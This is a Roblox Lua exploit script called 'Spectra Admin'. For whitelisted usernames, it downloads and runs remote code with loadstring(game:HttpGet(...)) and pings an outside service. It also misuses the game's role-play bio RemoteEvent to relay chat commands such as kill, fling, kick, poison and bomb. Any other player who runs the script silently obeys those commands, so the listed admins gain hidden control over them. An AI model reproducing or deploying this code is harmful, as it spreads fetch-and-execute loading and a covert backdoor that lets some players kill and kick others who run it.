local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

--// WHITELIST ROLES
local Owners = {
    -- "NomeDoDono1",
    -- "NomeDoDono2",
}

local Admins = {
    "udydydi2usy6d6d",
    "Denolk_new",
    "BaneSlimeBacon",
    "matheus_gondimr",
    "BallerLives3",
    "AlvaradoJustin2",
    "itz_pedro7229"
}

local function GetPlayerRole(playerName)
    for _, name in ipairs(Owners) do
        if name == playerName then
            return "Owner"
        end
    end
    for _, name in ipairs(Admins) do
        if name == playerName then
            return "Admin"
        end
    end
    return nil
end

local IsWhitelisted = GetPlayerRole(LocalPlayer.Name) ~= nil

local WindUI = nil
if IsWhitelisted then
    pcall(function()
        print(game:HttpGet("https://nexviewsservice.shardweb.app/services/stelarium_hub/start"))
    end)
    local success, result = pcall(function()
        return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
    end)
    if success then
        WindUI = result
    else
        warn("Falha ao carregar WindUI")
    end
end

function gradient(text, startColor, endColor)
    local result = ""
    local length = #text
    for i = 1, length do  
        local t = (i - 1) / math.max(length - 1, 1)  
        local r = math.floor((startColor.R + (endColor.R - startColor.R) * t) * 255)  
        local g = math.floor((startColor.G + (endColor.G - startColor.G) * t) * 255)  
        local b = math.floor((startColor.B + (endColor.B - startColor.B) * t) * 255)  
        local char = text:sub(i, i)  
        result = result .. "<font color=\"rgb(" .. r ..", " .. g .. ", " .. b .. ")\">" .. char .. "</font>"  
    end  
    return result
end


local function SendChat(msg)
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer("RolePlayBio", msg)
    task.delay(3, function()
        ReplicatedStorage:WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer("RolePlayBio", "")
    end)
end


if IsWhitelisted and WindUI then
    local Window = WindUI:CreateWindow({
        Title = "Spectra_Admin",
        Icon = "rbxassetid://16917184359",
        Author = "Dev Painel: Denolk",
        Folder = "spectrapainel",
        Size = UDim2.fromOffset(330, 240),  
        Transparent = true,  
        Theme = "Dark",  
        Resizable = true,  
        SideBarWidth = 200,  
        HideSearchBar = true,  
        ScrollBarEnabled = false,  
        HasOutline = false,  
        Background = "rbxassetid://9896226010",  
        BackgroundImageTransparency = 0.10
    })


    local SelectedPlayer = nil

    local function GetPlayerNames()
        local list = {}
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                table.insert(list, plr.Name)
            end
        end
        return list
    end


    local Tab = Window:Tab({
        Title = "Comandos",
        Icon = "terminal"
    })

    local CommandSection = Tab:Section({
        Title = "Comandos Spectra",
        Icon = "user-cog",
        Opened = true
    })


    local PlayerDropdown = CommandSection:Dropdown({
        Title = "Selecionar Jogador",
        Values = GetPlayerNames(),
        Callback = function(value)
            SelectedPlayer = value
        end
    })

    local function RefreshPlayers()
        PlayerDropdown:Refresh(GetPlayerNames())
    end

    Players.PlayerAdded:Connect(RefreshPlayers)
    Players.PlayerRemoving:Connect(RefreshPlayers)


    local function CmdButton(title, cmd)
        CommandSection:Button({
            Title = title,
            Callback = function()
                if SelectedPlayer then
                    SendChat(cmd .. " " .. SelectedPlayer)
                end
            end
        })
    end

    CmdButton("Kill", ";kill")
    CmdButton("KillPlus", ";killplus")
    CmdButton("Fling", ";fling")
    CmdButton("Fling OP", ";flingop")
    CmdButton("Jail", ";jail")
    CmdButton("Unjail", ";unjail")
    CmdButton("Frozen", ";frozen")
    CmdButton("Unfrozen", ";unfrozen")
    CmdButton("Poison", ";poison")
    CmdButton("Sit", ";sit")
    CmdButton("Kick", ";kick")
    CmdButton("Bomb", ";bomb")
    CmdButton("Float", ";float")
    CmdButton("Backrooms", ";backrooms")


    CommandSection:Button({
        Title = "Verifique",
        Callback = function()
            SendChat(";verifique")
        end
    })
end


local function Char()
    return LocalPlayer.Character
end

local function Humanoid()
    local char = Char()
    return char and char:FindFirstChild("Humanoid")
end

local function HRP()
    local char = Char()
    return char and char:FindFirstChild("HumanoidRootPart")
end


local JailModel = nil

local function RemoveJail()
    if JailModel then
        JailModel:Destroy()
        JailModel = nil
    end
end


local Floating = false
local FloatConn

local function StartFloat()
    if Floating then return end
    local hum = Humanoid()
    if not hum then return end
    Floating = true
    hum.WalkSpeed = 0
    hum.JumpPower = 0

    FloatConn = RunService.Heartbeat:Connect(function()  
        local root = HRP()
        if root then
            root.AssemblyLinearVelocity = Vector3.new(0, 20, 0)
        end
    end)
end

LocalPlayer.CharacterAdded:Connect(function()
    Floating = false
    if FloatConn then
        FloatConn:Disconnect()
        FloatConn = nil
    end
end)


local Frozen = false
local OldWalkSpeed = 16
local OldJumpPower = 50


local Actions = {
    [";kill"] = function()
        local hum = Humanoid()
        if hum then hum.Health = 0 end
    end,

    [";fling"] = function()
        local root = HRP()
        if root then root.Velocity = Vector3.new(6000, 300, 6000) end
    end,

    [";flingop"] = function()
        local root = HRP()
        if root then root.Velocity = Vector3.new(0, 150000, 0) end
    end,

    [";jail"] = function()
        if JailModel then return end
        local root = HRP()
        if not root then return end

        JailModel = Instance.new("Model")
        JailModel.Name = "SpectraJail"
        JailModel.Parent = Workspace

        local base = root.CFrame

        local function wall(size, offset)
            local p = Instance.new("Part")
            p.Anchored = true
            p.CanCollide = true
            p.Size = size
            p.Transparency = 0.4
            p.Material = Enum.Material.ForceField
            p.Color = Color3.fromRGB(255,0,0)
            p.CFrame = base * offset
            p.Parent = JailModel
        end

        wall(Vector3.new(18,12,1), CFrame.new(0,0,9))
        wall(Vector3.new(18,12,1), CFrame.new(0,0,-9))
        wall(Vector3.new(1,12,18), CFrame.new(9,0,0))
        wall(Vector3.new(1,12,18), CFrame.new(-9,0,0))
        wall(Vector3.new(18,1,18), CFrame.new(0,-6,0))
        wall(Vector3.new(18,1,18), CFrame.new(0,6,0))
    end,

    [";unjail"] = RemoveJail,

    [";kick"] = function()
        LocalPlayer:Kick("Voce foi expulso por um user do Spectra Admin")
    end,

    [";sit"] = function()
        local hum = Humanoid()
        if hum then hum.Sit = true end
    end,

    [";poison"] = function()
        local hum = Humanoid()
        if not hum then return end
        task.spawn(function()
            for i = 1, 20 do
                if hum.Health <= 0 then break end
                hum.Health = hum.Health - 3
                task.wait(0.5)
            end
        end)
    end,

    [";killplus"] = function()
        local root = HRP()
        local hum = Humanoid()
        if not root or not hum then return end

        for i = 1, 45 do
            local p = Instance.new("Part")
            p.Size = Vector3.new(0.6, 0.6, 0.6)
            p.Material = Enum.Material.Neon
            p.Color = Color3.fromHSV(math.random(), 1, 1)
            p.CFrame = root.CFrame
            p.Anchored = false
            p.CanCollide = true
            p.AssemblyLinearVelocity = Vector3.new(
                math.random(-35, 35),
                math.random(20, 45),
                math.random(-35, 35)
            )
            p.Parent = Workspace
            game:GetService("Debris"):AddItem(p, 2.5)
        end

        hum.Health = 0
    end,

    [";frozen"] = function()
        if Frozen then return end
        local hum = Humanoid()
        local root = HRP()
        if not hum or not root then return end

        Frozen = true
        OldWalkSpeed = hum.WalkSpeed
        OldJumpPower = hum.JumpPower

        hum.WalkSpeed = 0
        hum.JumpPower = 0
        hum.AutoRotate = false
        root.Anchored = true
    end,

    [";unfrozen"] = function()
        if not Frozen then return end
        local hum = Humanoid()
        local root = HRP()
        if not hum or not root then return end

        Frozen = false
        hum.WalkSpeed = OldWalkSpeed
        hum.JumpPower = OldJumpPower
        hum.AutoRotate = true
        root.Anchored = false
    end,

    [";bomb"] = function()
        local root = HRP()
        if not root then return end
        local e = Instance.new("Explosion")
        e.Position = root.Position
        e.BlastRadius = 20
        e.Parent = Workspace
        local hum = Humanoid()
        if hum then hum.Health = 0 end
    end,

    [";float"] = function()
        StartFloat()
    end,

    [";backrooms"] = function()
        local root = HRP()
        if not root then return end

        local mapID = 10581711055
        local success, mapa = pcall(function()
            return game:GetObjects("rbxassetid://" .. mapID)[1]
        end)

        if success and mapa then
            mapa.Parent = Workspace
            mapa.PrimaryPart = mapa.PrimaryPart or mapa:FindFirstChildWhichIsA("BasePart")
            if mapa.PrimaryPart then
                mapa:SetPrimaryPartCFrame(CFrame.new(0, 10000, 0))
            end
        end

        root.CFrame = CFrame.new(59, 9996, 19)
    end
}


if IsWhitelisted then
    local function criarTag(head, role)
        for _, existing in ipairs(head:GetChildren()) do
            if existing.Name == "SpectraTag" then
                existing:Destroy()
            end
        end

        local gui = Instance.new("BillboardGui", head)
        gui.Name = "SpectraTag"
        gui.Size = UDim2.new(0, 150, 0, 36)
        gui.StudsOffset = Vector3.new(0, 2.8, 0)
        gui.AlwaysOnTop = true

        local frame = Instance.new("Frame", gui)
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        frame.BackgroundTransparency = 0.25
        Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)

        local stroke = Instance.new("UIStroke", frame)
        stroke.Thickness = 2

        local txt = Instance.new("TextLabel", frame)
        txt.Size = UDim2.new(1, 0, 1, 0)
        txt.BackgroundTransparency = 1
        txt.TextScaled = true
        txt.Font = Enum.Font.GothamBold

        if role == "Owner" then
            stroke.Color = Color3.fromRGB(255, 0, 0)
            txt.Text = "Dono Spectra"
            txt.TextColor3 = Color3.fromRGB(255, 200, 200)
        elseif role == "Admin" then
            stroke.Color = Color3.fromRGB(0, 100, 255)
            txt.Text = "Admin Spectra"
            txt.TextColor3 = Color3.fromRGB(200, 200, 255)
        end
    end

    local function aplicarTagAoJogador(player)
        local role = GetPlayerRole(player.Name)
        if not role then return end

        local function applyToCharacter(character)
            local head = character:WaitForChild("Head", 10)
            if head then
                criarTag(head, role)
            end
        end

        if player.Character then
            applyToCharacter(player.Character)
        end

        player.CharacterAdded:Connect(applyToCharacter)
    end

    for _, player in ipairs(Players:GetPlayers()) do
        task.spawn(function() aplicarTagAoJogador(player) end)
    end

    Players.PlayerAdded:Connect(aplicarTagAoJogador)
end


local function OnMessage(text, speaker)
    if not text then return end
    local msg = string.lower(text)
    local myName = string.lower(LocalPlayer.Name)

    -- Comandos direcionados ao jogador local
    for cmd, action in pairs(Actions) do
        if msg == cmd .. " " .. myName then
            action()
        end
    end

    -- Verificacao: se alguem enviar ";verifique", responde com "Spectra_####" na bio
    if msg == ";verifique" then
        ReplicatedStorage:WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer("RolePlayBio", "Spectra_####")
        task.delay(3, function()
            ReplicatedStorage:WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer("RolePlayBio", "")
        end)
    end
end


if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
    TextChatService.TextChannels.RBXGeneral.OnIncomingMessage = function(message)
        local speaker = message.TextSource and Players:GetPlayerByUserId(message.TextSource.UserId)
        OnMessage(message.Text, speaker)
    end
else
    local function onChatted(msg, speaker)
        OnMessage(msg, speaker)
    end

    for _, p in ipairs(Players:GetPlayers()) do
        p.Chatted:Connect(function(msg)
            onChatted(msg, p)
        end)
    end

    Players.PlayerAdded:Connect(function(p)
        p.Chatted:Connect(function(msg)
            onChatted(msg, p)
        end)
    end)
end
